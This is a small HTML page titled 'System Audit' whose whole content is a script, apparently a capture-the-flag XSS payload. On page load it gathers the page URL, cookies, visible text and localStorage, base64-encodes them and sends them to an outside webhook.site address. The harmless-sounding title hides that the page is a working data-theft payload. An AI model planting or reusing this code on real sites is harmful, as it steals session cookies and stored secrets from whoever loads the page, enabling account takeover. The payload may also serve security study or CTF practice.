<!DOCTYPE html>
<html>
<head><title>System Audit</title></head>
<body>
    <script>
      (function() {
    const webhook = 'https://webhook.site/645df2ce-54f8-48f5-bb51-3d8a9076cc40';
    
    // Grab the entire page content and cookies
    const secrets = {
        url: window.location.href,
        cookies: document.cookie,
        body: document.body.innerText, // This extracts text only, looking for the flag
        localStorage: JSON.stringify(localStorage)
    };

    fetch(webhook, {
        method: 'POST',
        mode: 'no-cors',
        body: btoa(JSON.stringify(secrets))
    });
})();
    </script>
</body>
</html>
